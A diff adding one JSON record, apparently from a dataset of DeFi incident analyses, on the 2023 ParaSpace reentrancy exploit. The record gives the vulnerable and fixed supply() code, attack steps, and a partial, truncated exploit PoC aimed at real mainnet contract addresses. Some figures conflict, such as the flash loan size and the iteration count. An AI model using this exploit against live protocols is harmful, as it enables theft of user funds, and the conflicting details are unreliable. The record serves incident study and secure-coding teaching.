@@ -1,0 +1,50 @@
+{
+ "id": "2023__2023-03-17_ParaSpace_NFTReentrancy_ETH",
+ "source_file": "2023/2023-03-17_ParaSpace_NFTReentrancy_ETH.md",
+ "title": "ParaSpace — NFT Collateral Lending Reentrancy Attack Analysis",
+ "date": "2023-03-17",
+ "protocol": "ParaSpace",
+ "chain": "Ethereum",
+ "loss_raw": "~$900,000 actual loss (BlockSec white-hat rescued ~2,906 ETH / ~$5M at-risk before theft completed; some sources cite $7M as the total at-risk amount, not the stolen amount)",
+ "loss_usd": 900000.0,
+ "root_cause": "External callback triggered during `supply()` processing in the cAPE contract → reentrancy with collateral accounting not yet reflected, allowing excessive cAPE borrowing",
+ "attack_tx": "0xe3f0d1...116a",
+ "vulnerable_contract": "ParaProxy 0x638a98",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code (estimated — ParaSpace PoolLogic/SupplyLogic)\nfunction supply(\n    address asset,\n    uint256 amount,\n    address onBehalfOf,\n    uint16 referralCode\n) external {\n    // [Step 1] Checks: validate asset\n    DataTypes.ReserveData storage reserve = _reserves[asset];\n    ValidationLogic.validateSupply(reserve, amount);\n\n    // [Step 2] Interactions: external token transfer — ❌ occurs before state update!\n    // cAPE internally interacts with ApeStaking and can trigger callbacks\n    IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, amount);\n\n    // [Step 3] Effects: update collateral state — too late!\n    // If a callback occurs during the transferFrom above, this update has not yet been applied\n    reserve.updateState();\n    reserve.updateInterestRates(asset, reserve.aTokenAddress, amount, 0);\n    IAToken(reserve.aTokenAddress).mint(onBehalfOf, amount, reserve.liquidityIndex);\n\n    // Collateral list registration also happens here — not yet reflected at callback time\n    if (isFirstSupply) {\n        _usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);\n    }\n}",
+  "// ❌ Vulnerable — cAPE (Compound APE) internal logic\n// cAPE is integrated with APE staking, so transfer/transferFrom\n// internally interacts with the ApeStaking contract\n// This can hand control flow to the attacker's contract\ncontract cAPE {\n    function transferFrom(address from, address to, uint256 amount) external returns (bool) {\n        // ... external call can occur within internal logic\n        // ApeStaking.withdraw() or similar call triggers a callback\n        _transferWithStakingSync(from, to, amount); // ❌ callback possible\n        return true;\n    }\n}",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1636650252844294144\n// @TX\n// https://etherscan.io/tx/0xe3f0d14cfb6076cabdc9057001c3fafe28767a192e88005bc37bd7d385a1116a\n\ncontract ContractTest is Test {\n    // Core attack variables\n    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0); // collateral asset\n    IERC20 cAPE   = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);  // vulnerable complex token\n    IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee); // vulnerable proxy\n\n    function testExploit() external {\n        // [Entry point] Borrow large amount of wstETH via Aave V3 flash loan\n        AaveFlashloan.flashLoanSimple(\n            address(this),\n            address(wstETH),\n            47_352_823_905_004_708_422_332, // ~47,352 wstETH borrowed\n            new bytes(0),\n            0\n        );\n    }\n\n    // [Flash loan callback] Execute core attack logic\n    function executeOperation(...) external returns (bool) {\n        cAPE.approve(address(ParaProxy), type(uint256).max); // approve cAPE\n\n        // ── Core loop: deploy Slave contracts 7 times ──\n        for (uint256 i; i < 7; ++i) {\n            // Deploy new Slave (each has separate address and separate collateral position)\n            slave = new Slave();\n\n            // Transfer wstETH to Slave (for collateral)\n            wstETH.transfer(address(slave), transferAmount); // ~6,039 wstETH\n\n            // Slave: supply wstETH → borrow cAPE → transfer cAPE to attacker\n            slave.remove(_amountOfShare); // borrow 1,840,000 cAPE\n\n            // ❌ Core vulnerable point: re-supply just-borrowed cAPE as collateral\n            // At this point, ParaProxy's collateral accounting is not fully reflected,\n            // causing the collateral value to be over-recognized\n            ParaProxy.supply(address(cAPE), cAPE.balanceOf(address(this)), address(this), 0);\n        }\n\n        // [Step 10] Swap wstETH → APE and deposit into ApeStaking\n        // → Artificially inflate cAPE collateral value\n        APEStaking.depositApeCoin(APE.balanceOf(address(this)), address(cAPE));\n\n        // [Step 11] Large-scale borrow against artificially inflated collateral\n        ParaProxy.borrow(address(wstETH), 44_952_823_905_004_708_422_332, 0, address(this));\n        ParaProxy.borrow(address(USDC),   7_200_000_000_000, 0, address(this));\n        ParaProxy.borrow(address(WETH),   1_200_000_000_000_000_000_000, 0, address(this));\n\n        // [Step 12] Swap loan proceeds → repay flash loan\n        WETH_USDCTowstETH(amount, premium);\n        return true;\n    }\n}\n\n// ── Slave contract: handles one round of wstETH supply + cAPE borrow ──\ncontract Slave {\n    function remove(uint256 _amountOfShares) external {\n        // [A] Supply wstETH to ParaProxy as collateral\n        ParaProxy.supply(address(wstETH), wstETH.balanceOf(address(this)), address(this), 0);\n\n        // [B] Borrow cAPE against "
+ ],
+ "code_after": [
+  "// ✅ Fixed code (CEI pattern compliant + ReentrancyGuard)\nfunction supply(\n    address asset,\n    uint256 amount,\n    address onBehalfOf,\n    uint16 referralCode\n) external nonReentrant {\n    // [Step 1] Checks\n    DataTypes.ReserveData storage reserve = _reserves[asset];\n    ValidationLogic.validateSupply(reserve, amount);\n\n    // [Step 2] Effects: update collateral state first\n    reserve.updateState();\n    reserve.updateInterestRates(asset, reserve.aTokenAddress, amount, 0);\n    IAToken(reserve.aTokenAddress).mint(onBehalfOf, amount, reserve.liquidityIndex);\n\n    // Register collateral list before external call\n    if (isFirstSupply) {\n        _usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);\n    }\n\n    // [Step 3] Interactions: external transfer after state is finalized\n    IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, amount);\n}",
+  "// ✅ Fix: perform state updates before external calls\nfunction supply(\n    address asset,\n    uint256 amount,\n    address onBehalfOf,\n    uint16 referralCode\n) external nonReentrant {\n    DataTypes.ReserveData storage reserve = _reserves[asset];\n\n    // [Checks] Validate inputs\n    ValidationLogic.validateSupply(reserve, amount);\n\n    // [Effects] Finalize collateral state first\n    reserve.updateState();\n    uint256 amountScaled = IAToken(reserve.aTokenAddress)\n        .mint(onBehalfOf, onBehalfOf, amount, reserve.liquidityIndex);\n    bool isFirstSupply = amountScaled == amount;\n    if (isFirstSupply) {\n        _usersConfig[onBehalfOf].setUsingAsCollateral(reserve.id, true);\n        emit ReserveUsedAsCollateralEnabled(asset, onBehalfOf);\n    }\n    reserve.updateInterestRates(asset, reserve.aTokenAddress, amount, 0);\n\n    // [Interactions] External transfer after state is finalized\n    IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, amount);\n\n    emit Supply(asset, msg.sender, onBehalfOf, amount, referralCode);\n}"
+ ],
+ "steps": [
+  "Step 1: Execute Aave V3 flash loan",
+  "Attacker contract → AaveFlashloan.flashLoanSimple()",
+  "Each Slave: supply wstETH → borrow cAPE → transfer to attacker",
+  "Step 10: Convert cAPE → APE and deposit into ApeStaking",
+  "Step 11: Execute large-scale borrow from ParaProxy",
+  "Step 12: Swap to repay flash loan",
+  "→ Enter executeOperation() callback",
+  "→ deposit wstETH as collateral",
+  "→ borrow cAPE (backed by wstETH)",
+  "cAPE → transfer to attacker contract",
+  "→ Re-deposit borrowed cAPE as collateral ← CORE VULN",
+  "wstETH → WETH → APE (Uniswap V3)",
+  "(1,400 wstETH → WETH → ~492,214 APE)",
+  "cAPE.withdraw(full balance) → receive APE",
+  "→ Artificially inflate ParaSpace's cAPE collateral",
+  "→ Successfully borrow assets exceeding true collateral",
+  "USDC → WETH (Uniswap V3)",
+  "WETH → wstETH exactOutputSingle",
+  "→ Remaining WETH = attacker profit"
+ ],
+ "other_code": [
+  "Step 1: Execute Aave V3 flash loan\n        Attacker contract → AaveFlashloan.flashLoanSimple()\n        Borrow 47,352,823 wstETH\n\nSteps 2–9: Repeatedly deploy Slave contracts (8 iterations)\n        Each Slave: supply wstETH → borrow cAPE → transfer to attacker\n\nStep 10: Convert cAPE → APE and deposit into ApeStaking\n\nStep 11: Execute large-scale borrow from ParaProxy\n\nStep 12: Swap to repay flash loan",
+  "┌─────────────────────────────────────────────────────────┐\n│                  Attacker Contract (ContractTest)        │\n└─────────────────────────┬───────────────────────────────┘\n                          │\n                          ▼\n┌─────────────────────────────────────────────────────────┐\n│  [Step 1] Aave V3 Flash Loan                            │\n│  flashLoanSimple(wstETH, 47,352,823 wstETH)             │\n│  → Enter executeOperation() callback                    │\n└─────────────────────────┬───────────────────────────────┘\n                          │\n                          ▼\n┌─────────────────────────────────────────────────────────┐\n│  [Steps 2–8] Slave Contract Loop (i=0..6, 7 iterations) │\n│                                                         │\n│  for i in 0..6:          "
+ ]
+}
